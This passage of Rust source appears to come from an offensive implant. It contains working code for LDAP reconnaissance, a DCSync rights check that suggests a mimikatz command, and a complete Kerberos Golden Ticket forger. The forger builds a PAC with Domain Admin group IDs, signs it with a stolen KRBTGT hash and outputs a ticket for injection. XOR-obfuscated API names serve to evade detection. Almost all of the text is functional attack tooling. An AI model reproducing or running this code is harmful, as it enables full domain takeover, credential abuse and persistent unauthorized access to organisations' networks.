    let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let mut attr_bufs: Vec<Vec<u8>> = attrs.iter().map(|a| {
        a.bytes().chain(core::iter::once(0u8)).collect()
    }).collect();
    let mut attrs_ptrs: Vec<*const u8> = attr_bufs.iter().map(|b| b.as_ptr()).collect();
    attrs_ptrs.push(core::ptr::null());

    let mut res_msg: *mut u8 = core::ptr::null_mut();
    let sr = unsafe {
        fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(), attrs_ptrs.as_ptr(), 0, &mut res_msg)
    };
    if sr != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_search_s: {sr:#x}")); }

    let mut results: Vec<(String, Vec<(String, Vec<String>)>)> = Vec::new();
    let mut entry = unsafe { fn_first(ld, res_msg) };
    while !entry.is_null() {
        let dn_ptr = unsafe { fn_getdn(ld, entry) };
        let dn = if dn_ptr.is_null() {
            String::new()
        } else {
            let s = unsafe { std::ffi::CStr::from_ptr(dn_ptr as *const i8) }
                .to_string_lossy().to_string();
            unsafe { fn_memfree(dn_ptr) };
            s
        };

        let mut obj_attrs: Vec<(String, Vec<String>)> = Vec::new();
        for ab in attr_bufs.iter() {
            // Try string values first
            let vals = unsafe { fn_getvals(ld, entry, ab.as_ptr()) };
            if !vals.is_null() {
                let attr_name = String::from_utf8_lossy(&ab[..ab.len()-1]).to_string();
                let mut attr_vals: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let v = unsafe { *vals.add(i) };
                    if v.is_null() { break; }
                    let s = unsafe { std::ffi::CStr::from_ptr(v as *const i8) }
                        .to_string_lossy().to_string();
                    attr_vals.push(s);
                    i += 1;
                }
                unsafe { fn_valfree(vals) };
                if !attr_vals.is_empty() {
                    obj_attrs.push((attr_name, attr_vals));
                    continue;
                }
            }
            // Fall back to binary (ldap_get_values_len)
            let bvals = unsafe { fn_getlenvals(ld, entry, ab.as_ptr()) };
            if !bvals.is_null() {
                let attr_name = String::from_utf8_lossy(&ab[..ab.len()-1]).to_string();
                let mut attr_vals: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let bv = unsafe { *bvals.add(i) };
                    if bv.is_null() { break; }
                    // BERVAL on x64: bv_len(u32) + pad(u32) + bv_val(*mut u8) at offset 8
                    let bv_len = unsafe { *(bv as *const u32) } as usize;
                    let bv_val = unsafe { *((bv as *const u8).add(8) as *const *const u8) };
                    if !bv_val.is_null() && bv_len > 0 {
                        let bytes = unsafe { core::slice::from_raw_parts(bv_val, bv_len) };
                        let hex: String = bytes.iter().map(|b| format!("{b:02x}")).collect();
                        attr_vals.push(format!("HEX:{hex}"));
                    }
                    i += 1;
                }
                unsafe { fn_lenfree(bvals) };
                if !attr_vals.is_empty() {
                    obj_attrs.push((attr_name, attr_vals));
                }
            }
        }
        results.push((dn, obj_attrs));
        entry = unsafe { fn_next(ld, entry) };
    }

    unsafe { fn_msgfree(res_msg) };
    unsafe { fn_unbind(ld) };
    Ok(results)
}

// ── DCSync ────────────────────────────────────────────────────────────────────
//
// Enumerate domain credentials via DRSUAPI replication path.
// Requires DS-Replication-Get-Changes-All (Domain Admin or explicit delegation).
// Args: {"user":"<sAMAccountName>", "domain":"<fqdn>", "dc":"<hostname>"}
//
// On non-domain or insufficient-rights context: returns intelligence about
// the target account and whether DCSync rights are detectable.

#[cfg(target_os = "windows")]
fn cred_dcsync(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let target = v.get("user").and_then(|s| s.as_str()).unwrap_or("krbtgt");

    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("dcsync: USERDNSDOMAIN not set (non-domain machine)"),
    };

    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());

    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>().join(",");

    // Query target user attributes
    let user_filter = format!("(&(objectClass=user)(sAMAccountName={target}))");
    let user_attrs = match ldap_query_attrs(&dc, &base_dn, &user_filter, &[
        "sAMAccountName", "distinguishedName", "userAccountControl",
        "pwdLastSet", "lastLogon", "memberOf", "adminCount", "description",
        "servicePrincipalName", "msDS-KeyCredentialLink",
    ]) {
        Ok(r) => r,
        Err(e) => return TaskOutput::failure(&format!("dcsync: ldap query failed: {e}")),
    };

    // Check for replication rights: query if current user is in Domain Admins or
    // has explicit DS-Replication-Get-Changes-All delegation
    let current_user = std::env::var("USERNAME").unwrap_or_default();
    let is_da = {
        let user_filter = format!("(&(objectClass=user)(sAMAccountName={current_user}))");
        ldap_query_attrs(&dc, &base_dn, &user_filter, &["memberOf"])
            .map(|r| r.iter().any(|(_dn, attrs)| {
                attrs.iter().any(|(k, vals)|
                    k == "memberOf" && vals.iter().any(|v| v.to_ascii_lowercase().contains("domain admins"))
                )
            }))
            .unwrap_or(false)
    };

    // Try ntdsapi.dll DsBind to verify DRSUAPI connectivity
    // ntdsapi.dll XOR 0x5A: [0x34,0x2E,0x3E,0x29,0x3B,0x2A,0x33,0x74,0x3E,0x36,0x36,0x5A]
    let drsuapi_reachable = {
        let ntdsapi_name = crate::obfs::dec(&[0x34,0x2E,0x3E,0x29,0x3B,0x2A,0x33,0x74,0x3E,0x36,0x36,0x5A]);
        let mut ntdsapi = crate::loader::get_module_base(ntdsapi_name.as_ptr()) as usize;
        if ntdsapi == 0 {
            ntdsapi = unsafe { LoadLibraryA(ntdsapi_name.as_ptr()) } as usize;
        }
        if ntdsapi != 0 {
            // DsBindW XOR 0x5A: [0x1E,0x29,0x18,0x33,0x34,0x3E,0x0D,0x5A]
            type DsBindFn = unsafe extern "system" fn(*const u16, *const u16, *mut *mut u8) -> u32;
            type DsUnbindFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
            let fn_bind = unsafe { crate::loader::get_export_by_name(
                ntdsapi, crate::obfs::dec(&[0x1E,0x29,0x18,0x33,0x34,0x3E,0x0D,0x5A]).as_ptr()
            )}.map(|p| unsafe { core::mem::transmute::<_, DsBindFn>(p) });
            let fn_unbind = unsafe { crate::loader::get_export_by_name(
                ntdsapi, crate::obfs::dec(&[0x1E,0x29,0x0F,0x34,0x18,0x33,0x34,0x3E,0x0D,0x5A]).as_ptr()
            )}.map(|p| unsafe { core::mem::transmute::<_, DsUnbindFn>(p) });

            if let (Some(fb), Some(fu)) = (fn_bind, fn_unbind) {
                let dc_wide: Vec<u16> = dc.encode_utf16().chain(core::iter::once(0u16)).collect();
                let dom_wide: Vec<u16> = domain_fqdn.encode_utf16().chain(core::iter::once(0u16)).collect();
                let mut hds: *mut u8 = core::ptr::null_mut();
                let r = unsafe { fb(dc_wide.as_ptr(), dom_wide.as_ptr(), &mut hds) };
                if r == 0 && !hds.is_null() {
                    unsafe { fu(&mut hds) };
                    true
                } else { false }
            } else { false }
        } else { false }
    };

    // Build result
    let user_obj: Vec<serde_json::Value> = user_attrs.into_iter().map(|(dn, attrs)| {
        let mut m = serde_json::json!({"dn": dn});
        for (k, vals) in attrs {
            m[k] = serde_json::Value::Array(vals.into_iter().map(serde_json::Value::String).collect());
        }
        m
    }).collect();

    let result = serde_json::json!({
        "domain":             domain_fqdn,
        "dc":                 dc,
        "target":             target,
        "domain_dn":          base_dn,
        "target_objects":     user_obj,
        "current_user":       current_user,
        "is_domain_admin":    is_da,
        "drsuapi_reachable":  drsuapi_reachable,
        "dcsync_capable":     is_da && drsuapi_reachable,
        "next_step": if is_da && drsuapi_reachable {
            "DCSync capable — run: lsadump::dcsync /domain:<domain> /user:<user>"
        } else {
            "Insufficient rights or not domain-joined — escalate to Domain Admin first"
        }
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── Phase 4H: Kerberos Ticket Forgery ─────────────────────────────────────────

fn rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j = 0usize;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }
    let mut out = data.to_vec();
    let (mut i, mut j) = (0usize, 0usize);
    for b in &mut out {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        *b ^= s[(s[i] as usize + s[j] as usize) % 256];
    }
    out
}

// RC4-HMAC encryption (RFC 4757). Returns checksum(16) + ciphertext.
fn rc4hmac_encrypt(key: &[u8], usage: u32, plaintext: &[u8]) -> Vec<u8> {
    let k1 = hmac_md5(key, &usage.to_le_bytes());
    let mut confounder = [0u8; 8];
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut confounder);
    let mut data: Vec<u8> = Vec::with_capacity(8 + plaintext.len());
    data.extend_from_slice(&confounder);
    data.extend_from_slice(plaintext);
    let checksum = hmac_md5(&k1, &data);
    let ct = rc4(&k1, &data);
    let mut out = Vec::with_capacity(16 + ct.len());
    out.extend_from_slice(&checksum);
    out.extend_from_slice(&ct);
    out
}

// ── KRB5 ASN.1 DER helpers ────────────────────────────────────────────────────

fn klen(n: usize) -> Vec<u8> {
    if n < 0x80 { vec![n as u8] }
    else if n < 0x100 { vec![0x81, n as u8] }
    else { vec![0x82, (n >> 8) as u8, (n & 0xff) as u8] }
}
fn ktlv(tag: u8, d: &[u8]) -> Vec<u8> {
    let mut v = vec![tag]; v.extend(klen(d.len())); v.extend_from_slice(d); v
}
fn kseq(d: &[u8]) -> Vec<u8> { ktlv(0x30, d) }
fn kctx(n: u8, d: &[u8]) -> Vec<u8> { ktlv(0xa0 | n, d) }
fn kapp(n: u8, d: &[u8]) -> Vec<u8> { ktlv(0x60 | n, d) }
fn kostr(d: &[u8]) -> Vec<u8> { ktlv(0x04, d) }
fn kgstr(s: &str) -> Vec<u8>  { ktlv(0x1b, s.as_bytes()) }
fn kint(n: i64) -> Vec<u8> {
    if n == 0 { return ktlv(0x02, &[0]); }
    let bytes = n.to_be_bytes();
    let skip = bytes.iter().position(|&b| b != if n < 0 { 0xff } else { 0 }).unwrap_or(7);
    let skip = if skip > 0 && (bytes[skip] & 0x80 != 0) == (n < 0) { skip - 1 } else { skip };
    ktlv(0x02, &bytes[skip..])
}
fn kbitflags(flags: u32) -> Vec<u8> {
    let mut d = vec![0x00u8];  // 0 unused bits
    d.extend_from_slice(&flags.to_be_bytes());
    ktlv(0x03, &d)
}
fn kgentime(secs_since_epoch: u64) -> Vec<u8> {
    let (y, mo, d, h, mi, s) = unix_to_utc(secs_since_epoch);
    let ts = format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", y, mo, d, h, mi, s);
    ktlv(0x18, ts.as_bytes())
}
fn unix_to_utc(secs: u64) -> (u32, u32, u32, u32, u32, u32) {
    let time = secs % 86400;
    let days = secs / 86400;
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = z - era * 146097;
    let yoe = (doe - doe/1460 + doe/36524 - doe/146096) / 365;
    let y = (yoe + era * 400) as u32;
    let doy = doe - (365*yoe + yoe/4 - yoe/100);
    let mp = (5*doy + 2) / 153;
    let d = (doy - (153*mp+2)/5 + 1) as u32;
    let m = if mp < 10 { (mp + 3) as u32 } else { (mp - 9) as u32 };
    let y = if m <= 2 { y + 1 } else { y };
    (y, m, d, (time/3600) as u32, (time/60%60) as u32, (time%60) as u32)
}

fn build_principal(name_type: i32, parts: &[&str]) -> Vec<u8> {
    let mut names_seq = Vec::new();
    for p in parts { names_seq.extend(kgstr(p)); }
    let mut inner = Vec::new();
    inner.extend(kctx(0, &kint(name_type as i64)));
    inner.extend(kctx(1, &kseq(&names_seq)));
    kseq(&inner)
}
fn build_enc_data(etype: i32, cipher: &[u8]) -> Vec<u8> {
    let mut inner = Vec::new();
    inner.extend(kctx(0, &kint(etype as i64)));
    inner.extend(kctx(2, &kostr(cipher)));
    kseq(&inner)
}
fn build_enc_key(etype: i32, key: &[u8]) -> Vec<u8> {
    let mut inner = Vec::new();
    inner.extend(kctx(0, &kint(etype as i64)));
    inner.extend(kctx(1, &kostr(key)));
    kseq(&inner)
}

// Build EncTicketPart (APPLICATION 3) plaintext, to be encrypted with service/krbtgt key.
// authz_data: optional PAC bytes (pre-built KERB_VALIDATION_INFO PAC)
fn build_enc_ticket_part(
    session_key: &[u8], realm: &str, cname: &str,
    flags: u32, authtime: u64, endtime: u64,
    authz_data: Option<&[u8]>,
) -> Vec<u8> {
    let mut inner = Vec::new();
    inner.extend(kctx(0, &kbitflags(flags)));
    inner.extend(kctx(1, &build_enc_key(23, session_key)));
    inner.extend(kctx(2, &kgstr(realm)));
    inner.extend(kctx(3, &build_principal(1, &[cname])));
    // transited: empty
    let mut trans = Vec::new();
    trans.extend(kctx(0, &kint(0)));
    trans.extend(kctx(1, &kostr(&[])));
    inner.extend(kctx(4, &kseq(&trans)));
    inner.extend(kctx(5, &kgentime(authtime)));
    inner.extend(kctx(6, &kgentime(authtime)));
    inner.extend(kctx(7, &kgentime(endtime)));
    inner.extend(kctx(8, &kgentime(endtime + 7*86400)));
    if let Some(pac) = authz_data {
        // AuthorizationData: SEQUENCE { {ad-type=128, ad-data=pac} }
        let mut ad_entry = Vec::new();
        ad_entry.extend(kctx(0, &kint(128)));  // AD-IF-RELEVANT
        ad_entry.extend(kctx(1, &kostr(pac)));
        let outer = kseq(&kseq(&ad_entry));
        inner.extend(kctx(10, &outer));
    }
    kapp(3, &kseq(&inner))
}

// Build EncKrbCredPart (APPLICATION 29) plaintext.
fn build_enc_krb_cred_part(
    session_key: &[u8], realm: &str, cname: &str, svcname: &[&str],
    flags: u32, authtime: u64, starttime: u64, endtime: u64,
) -> Vec<u8> {
    let mut cred_info = Vec::new();
    cred_info.extend(kctx(0, &build_enc_key(23, session_key)));
    cred_info.extend(kctx(1, &kgstr(realm)));
    cred_info.extend(kctx(2, &build_principal(1, &[cname])));
    cred_info.extend(kctx(3, &kbitflags(flags)));
    cred_info.extend(kctx(4, &kgentime(authtime)));
    cred_info.extend(kctx(5, &kgentime(starttime)));
    cred_info.extend(kctx(6, &kgentime(endtime)));
    cred_info.extend(kctx(7, &kgentime(endtime + 7*86400)));
    cred_info.extend(kctx(8, &kgstr(realm)));
    let svc_nt = if svcname.len() == 1 { 1 } else { 2 };
    cred_info.extend(kctx(9, &build_principal(svc_nt, svcname)));
    let tkt_info_seq = kseq(&kseq(&cred_info));
    let mut outer = Vec::new();
    outer.extend(kctx(0, &tkt_info_seq));
    kapp(29, &kseq(&outer))
}

fn build_krb_cred(ticket_der: &[u8], enc_part_plain: &[u8]) -> Vec<u8> {
    // enc-part etype=0 means "no encryption" (cleartext), used by some tools
    // The enc_part_plain IS the EncKrbCredPart bytes
    let enc_part = build_enc_data(0, enc_part_plain);
    let mut tickets_seq = Vec::new();
    tickets_seq.extend_from_slice(ticket_der);
    let mut inner = Vec::new();
    inner.extend(kctx(0, &kint(5)));   // pvno
    inner.extend(kctx(1, &kint(22)));  // msg-type KRB-CRED
    inner.extend(kctx(2, &kseq(&tickets_seq)));
    inner.extend(kctx(3, &enc_part));
    kapp(22, &kseq(&inner))
}

// ── PAC builder (PACTYPE + KERB_VALIDATION_INFO NDR) ─────────────────────────

fn build_kerb_validation_info(
    username: &str, domain_netbios: &str, logon_server: &str,
    domain_sid: &[u32],   // sub-auths for S-1-5-21-A-B-C → [21, A, B, C]
    user_rid: u32, primary_group: u32, groups: &[u32],
    logon_time: u64, session_key: &[u8; 16], uac: u32,
) -> Vec<u8> {
    const MAX_T: u64 = 0x7fff_ffff_ffff_ffff;
    let mut fix = Vec::<u8>::new();
    let mut refs = Vec::<u8>::new();
    let mut rid: u32 = 0x0002_0004;

    let new_rid = |rid: &mut u32| { let r = *rid; *rid += 4; r };

    let ustr_fix = |s: &str, fix: &mut Vec<u8>, refs: &mut Vec<u8>, rid: &mut u32| {
        if s.is_empty() {
            fix.extend_from_slice(&0u16.to_le_bytes());
            fix.extend_from_slice(&0u16.to_le_bytes());
            fix.extend_from_slice(&0u32.to_le_bytes());
            return;
        }
        let w: Vec<u16> = s.encode_utf16().collect();
        let len = (w.len() * 2) as u16;
        let mlen = len + 2;
        fix.extend_from_slice(&len.to_le_bytes());
        fix.extend_from_slice(&mlen.to_le_bytes());
        fix.extend_from_slice(&new_rid(rid).to_le_bytes());
        let max_count = (mlen / 2) as u32;
        refs.extend_from_slice(&max_count.to_le_bytes());
        refs.extend_from_slice(&0u32.to_le_bytes());
        refs.extend_from_slice(&(w.len() as u32).to_le_bytes());
        for c in &w { refs.extend_from_slice(&c.to_le_bytes()); }
        while refs.len() % 4 != 0 { refs.push(0); }
    };

    // FILETIME x6
    fix.extend_from_slice(&logon_time.to_le_bytes());
    fix.extend_from_slice(&MAX_T.to_le_bytes());
    fix.extend_from_slice(&MAX_T.to_le_bytes());
    fix.extend_from_slice(&logon_time.to_le_bytes());
    fix.extend_from_slice(&0u64.to_le_bytes());
    fix.extend_from_slice(&MAX_T.to_le_bytes());

    // String pointers (fixed part + referents inline)
    ustr_fix(username,       &mut fix, &mut refs, &mut rid);
    ustr_fix("",             &mut fix, &mut refs, &mut rid); // FullName
    ustr_fix("",             &mut fix, &mut refs, &mut rid); // LogonScript
    ustr_fix("",             &mut fix, &mut refs, &mut rid); // ProfilePath
    ustr_fix("",             &mut fix, &mut refs, &mut rid); // HomeDirectory
    ustr_fix("",             &mut fix, &mut refs, &mut rid); // HomeDirectoryDrive

    // LogonCount, BadPasswordCount
    fix.extend_from_slice(&0u16.to_le_bytes());
    fix.extend_from_slice(&0u16.to_le_bytes());
    fix.extend_from_slice(&user_rid.to_le_bytes());
    fix.extend_from_slice(&primary_group.to_le_bytes());
    fix.extend_from_slice(&(groups.len() as u32).to_le_bytes());

    // GroupIds pointer — append referent data to refs
    fix.extend_from_slice(&new_rid(&mut rid).to_le_bytes());
    refs.extend_from_slice(&(groups.len() as u32).to_le_bytes()); // MaxCount
    for &g in groups {
        refs.extend_from_slice(&g.to_le_bytes());
        refs.extend_from_slice(&7u32.to_le_bytes()); // Attributes
    }

    fix.extend_from_slice(&0x20u32.to_le_bytes()); // UserFlags
    fix.extend_from_slice(session_key);             // UserSessionKey (16 bytes)

    // More string pointers
    ustr_fix(logon_server,   &mut fix, &mut refs, &mut rid);
    ustr_fix(domain_netbios, &mut fix, &mut refs, &mut rid);

    // LogonDomainId pointer
    fix.extend_from_slice(&new_rid(&mut rid).to_le_bytes());
    // SID referent
    refs.push(1u8);                              // Revision
    refs.push(domain_sid.len() as u8);           // SubAuthorityCount
    refs.extend_from_slice(&[0, 0, 0, 0, 0, 5]); // NT Authority
    for &sa in domain_sid { refs.extend_from_slice(&sa.to_le_bytes()); }

    // Remaining fixed fields
    fix.extend_from_slice(&[0u8; 8]);            // LMKey
    fix.extend_from_slice(&uac.to_le_bytes());
    fix.extend_from_slice(&0u32.to_le_bytes());  // SubAuthStatus
    fix.extend_from_slice(&0u64.to_le_bytes());  // LastSuccessfulILogon
    fix.extend_from_slice(&0u64.to_le_bytes());  // LastFailedILogon
    fix.extend_from_slice(&0u32.to_le_bytes());  // FailedILogonCount
    fix.extend_from_slice(&0u32.to_le_bytes());  // Reserved
    fix.extend_from_slice(&0u32.to_le_bytes());  // SidCount
    fix.extend_from_slice(&0u32.to_le_bytes());  // ExtraSids (null)
    fix.extend_from_slice(&0u32.to_le_bytes());  // ResourceGroupDomainSid (null)
    fix.extend_from_slice(&0u32.to_le_bytes());  // ResourceGroupCount
    fix.extend_from_slice(&0u32.to_le_bytes());  // ResourceGroupIds (null)

    // Combine with NDR common header (16 bytes)
    let body_size = (4 + fix.len() + refs.len()) as u32; // size after common header
    let mut ndr = Vec::new();
    // Common header: version=1, endian=0x10 (LE), header_len=8, filler=0xcccccccc
    ndr.extend_from_slice(&[0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc]);
    // Private header: body_size (u32 LE) + reserved (u32)
    ndr.extend_from_slice(&body_size.to_le_bytes());
    ndr.extend_from_slice(&0u32.to_le_bytes());
    // Outer referent ID for the pointer to KERB_VALIDATION_INFO
    ndr.extend_from_slice(&0x0002_0000u32.to_le_bytes());
    ndr.extend_from_slice(&fix);
    ndr.extend_from_slice(&refs);
    while ndr.len() % 8 != 0 { ndr.push(0); }
    ndr
}

fn build_pac(
    username: &str, domain_netbios: &str, logon_server: &str,
    domain_sid: &[u32], user_rid: u32, primary_group: u32, groups: &[u32],
    logon_time: u64, session_key: &[u8; 16], krbtgt_key: &[u8],
) -> Vec<u8> {
    let kvi = build_kerb_validation_info(
        username, domain_netbios, logon_server,
        domain_sid, user_rid, primary_group, groups,
        logon_time, session_key, 0x10200,
    );

    // PAC_CLIENT_INFO: LogonTime(8) + NameLength(2) + Name(UTF16LE)
    let uname_w: Vec<u8> = username.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut client_info = Vec::new();
    client_info.extend_from_slice(&logon_time.to_le_bytes());
    client_info.extend_from_slice(&(uname_w.len() as u16).to_le_bytes());
    client_info.extend_from_slice(&uname_w);

    // Build PAC with placeholder signatures, compute, fill in
    // Buffer types: 1=LOGON_INFO, 10=CLIENT_INFO, 6=SERVER_SIG, 7=PRIVSVR_SIG
    let n_buffers: u32 = 4;
    let header_size = 8 + n_buffers as usize * 16; // PACTYPE(8) + n_buffers * PAC_INFO_BUFFER(16)

    let align8 = |n: usize| (n + 7) & !7;

    let kvi_off   = header_size;
    let kvi_pad   = align8(kvi_off + kvi.len()) - kvi.len() - kvi_off;
    let cli_off   = kvi_off + kvi.len() + kvi_pad;
    let cli_pad   = align8(cli_off + client_info.len()) - client_info.len() - cli_off;
    let srv_off   = cli_off + client_info.len() + cli_pad;
    let srv_size  = 20usize; // SignatureType(4) + Signature(16)
    let srv_pad   = align8(srv_off + srv_size) - srv_size - srv_off;
    let kdc_off   = srv_off + srv_size + srv_pad;
    let kdc_size  = 20usize;

    let mut pac = Vec::new();
    // PACTYPE header
    pac.extend_from_slice(&n_buffers.to_le_bytes());
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version = 0

    // PAC_INFO_BUFFER entries (each: ulType(4) + cbBufferSize(4) + Offset(8))
    let buf_entry = |typ: u32, sz: usize, off: usize| -> Vec<u8> {
        let mut e = Vec::new();
        e.extend_from_slice(&typ.to_le_bytes());
        e.extend_from_slice(&(sz as u32).to_le_bytes());
        e.extend_from_slice(&(off as u64).to_le_bytes());
        e
    };
    pac.extend(buf_entry(0x01, kvi.len(),       kvi_off));
    pac.extend(buf_entry(0x0a, client_info.len(), cli_off));
    pac.extend(buf_entry(0x06, srv_size,         srv_off));
    pac.extend(buf_entry(0x07, kdc_size,         kdc_off));

    // Buffer data
    pac.extend_from_slice(&kvi);
    for _ in 0..kvi_pad  { pac.push(0); }
    pac.extend_from_slice(&client_info);
    for _ in 0..cli_pad  { pac.push(0); }

    // Server signature (type 6): HMAC-MD5 = 0x00000077 (etype 23)
    // Initially zeroed for checksum computation
    let srv_sig_off = pac.len() + 4; // offset of signature bytes within pac
    pac.extend_from_slice(&0x0000_0077u32.to_le_bytes()); // SignatureType
    for _ in 0..16 { pac.push(0); } // Signature placeholder
    for _ in 0..srv_pad { pac.push(0); }

    // KDC signature (type 7): also HMAC-MD5 = etype 23
    let kdc_sig_off = pac.len() + 4;
    pac.extend_from_slice(&0x0000_0077u32.to_le_bytes());
    for _ in 0..16 { pac.push(0); } // Signature placeholder

    // Compute server signature = HMAC-MD5(krbtgt_key, pac_with_zeros)
    let srv_sig = hmac_md5(krbtgt_key, &pac);
    pac[srv_sig_off..srv_sig_off+16].copy_from_slice(&srv_sig);

    // Compute KDC signature = HMAC-MD5(krbtgt_key, server_signature)
    let kdc_sig = hmac_md5(krbtgt_key, &srv_sig);
    pac[kdc_sig_off..kdc_sig_off+16].copy_from_slice(&kdc_sig);

    pac
}

// Parse "S-1-5-21-A-B-C" → [21, A, B, C]
fn parse_sid(sid: &str) -> Result<Vec<u32>, String> {
    let parts: Vec<&str> = sid.trim().split('-').collect();
    if parts.len() < 4 || parts[0] != "S" || parts[1] != "1" || parts[2] != "5" {
        return Err(format!("invalid SID: {sid}"));
    }
    parts[3..].iter()
        .map(|p| p.parse::<u32>().map_err(|e| format!("SID parse: {e}")))
        .collect()
}

// Parse hex string to bytes
fn hex_to_bytes(h: &str) -> Result<Vec<u8>, String> {
    let h = h.trim().replace(' ', "").to_lowercase();
    (0..h.len()).step_by(2)
        .map(|i| u8::from_str_radix(&h[i..i+2], 16)
            .map_err(|e| format!("hex decode: {e}")))
        .collect()
}

fn current_unix_secs() -> u64 {
    use windows_sys::Win32::System::SystemInformation::GetSystemTimeAsFileTime;
    use windows_sys::Win32::Foundation::FILETIME;
    let mut ft = FILETIME { dwLowDateTime: 0, dwHighDateTime: 0 };
    unsafe { GetSystemTimeAsFileTime(&mut ft) };
    let ft64 = ((ft.dwHighDateTime as u64) << 32) | ft.dwLowDateTime as u64;
    // FILETIME is 100ns intervals since 1601-01-01; Unix epoch diff = 116444736000000000
    ft64.saturating_sub(116_444_736_000_000_000) / 10_000_000
}

// Convert Unix seconds to Windows FILETIME (100ns intervals since 1601-01-01)
fn unix_to_filetime(secs: u64) -> u64 {
    secs.saturating_mul(10_000_000).saturating_add(116_444_736_000_000_000)
}

// ── Golden Ticket ─────────────────────────────────────────────────────────────
//
// Constructs a KRB5 TGT with forged PAC using the KRBTGT hash.
// Requires: domain FQDN, domain SID, KRBTGT NTLM hash.
// Args: {"domain":"corp.local","sid":"S-1-5-21-A-B-C","krbtgt_ntlm":"<hex>",
//        "username":"administrator","user_id":500,"groups":[512,513,518,519,520],
//        "lifetime_hours":10}
// Returns: {"ticket_b64":"<base64 KRB-CRED>","inject_cmd":"..."}

#[cfg(target_os = "windows")]
fn cred_golden_ticket(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    let domain = match v.get("domain").and_then(|s| s.as_str()) {
        Some(d) => d.to_uppercase(),
        None    => return TaskOutput::failure("golden-ticket: missing domain"),
    };
    let sid_str = match v.get("sid").and_then(|s| s.as_str()) {
        Some(s) => s,
        None    => return TaskOutput::failure("golden-ticket: missing sid (S-1-5-21-X-Y-Z)"),
    };
    let krbtgt_hex = match v.get("krbtgt_ntlm").and_then(|s| s.as_str()) {
        Some(h) => h,
        None    => return TaskOutput::failure("golden-ticket: missing krbtgt_ntlm"),
    };
    let krbtgt_key = match hex_to_bytes(krbtgt_hex) {
        Ok(k) if k.len() == 16 => k,
        Ok(k)  => return TaskOutput::failure(&format!("golden-ticket: krbtgt_ntlm must be 32 hex chars, got {} bytes", k.len())),
        Err(e) => return TaskOutput::failure(&format!("golden-ticket: {e}")),
    };
    let domain_sid = match parse_sid(sid_str) {
        Ok(s) => s,
        Err(e) => return TaskOutput::failure(&format!("golden-ticket: {e}")),
    };
    let username  = v.get("username").and_then(|s| s.as_str()).unwrap_or("administrator");
    let user_id   = v.get("user_id").and_then(|n| n.as_u64()).unwrap_or(500) as u32;
    let lifetime  = v.get("lifetime_hours").and_then(|n| n.as_u64()).unwrap_or(10);
    let groups: Vec<u32> = v.get("groups").and_then(|a| a.as_array())
        .map(|arr| arr.iter().filter_map(|n| n.as_u64().map(|x| x as u32)).collect())
        .unwrap_or_else(|| vec![512, 513, 518, 519, 520]);

    let domain_netbios = domain.split('.').next().unwrap_or(&domain).to_string();
    let now      = current_unix_secs();
    let endtime  = now + lifetime * 3600;
    let ft_now   = unix_to_filetime(now);
    let flags: u32 = 0x40e10000; // forwardable,proxiable,renewable,initial,pre-auth

    // Generate random session key
    let mut session_key = [0u8; 16];
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut session_key);

    // Build PAC
    let pac = build_pac(
        username, &domain_netbios, "",
        &domain_sid, user_id, 513, &groups,
        ft_now, &session_key, &krbtgt_key,
    );

    // Wrap PAC in AuthorizationData (IF-RELEVANT = 1, then PAC = 128)
    let mut pac_inner = Vec::new();
    pac_inner.extend(kctx(0, &kint(128)));
    pac_inner.extend(kctx(1, &kostr(&pac)));
    let authz = kseq(&kseq(&pac_inner));

    // Build EncTicketPart (APPLICATION 3) + encrypt with KRBTGT key, usage 2
    let enc_ticket_plain = build_enc_ticket_part(
        &session_key, &domain, username, flags, now, endtime, Some(&authz),
    );
    let enc_ticket_cipher = rc4hmac_encrypt(&krbtgt_key, 2, &enc_ticket_plain);

    // Build Ticket (APPLICATION 1)
    let mut tkt_inner = Vec::new();
    tkt_inner.extend(kctx(0, &kint(5)));
    tkt_inner.extend(kctx(1, &kgstr(&domain)));
    tkt_inner.extend(kctx(2, &build_principal(2, &["krbtgt", &domain])));
    tkt_inner.extend(kctx(3, &build_enc_data(23, &enc_ticket_cipher)));
    let ticket_der = kapp(1, &kseq(&tkt_inner));

    // Build EncKrbCredPart (APPLICATION 29) — plaintext (etype=0)
    let enc_cred_plain = build_enc_krb_cred_part(
        &session_key, &domain, username,
        &["krbtgt", &domain], flags, now, now, endtime,
    );

    let krb_cred = build_krb_cred(&ticket_der, &enc_cred_plain);
    let ticket_b64 = base64::engine::general_purpose::STANDARD.encode(&krb_cred);

    let result = serde_json::json!({
        "status":       "golden ticket constructed",
        "username":     username,
        "domain":       domain,
        "sid":          sid_str,
        "user_id":      user_id,
        "groups":       groups,
        "lifetime_hours": lifetime,
        "ticket_b64":   ticket_b64,
        "next_step":    "inject via cred/ptt {ticket_b64: \"<value above>\"}",
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── Silver Ticket ─────────────────────────────────────────────────────────────
//
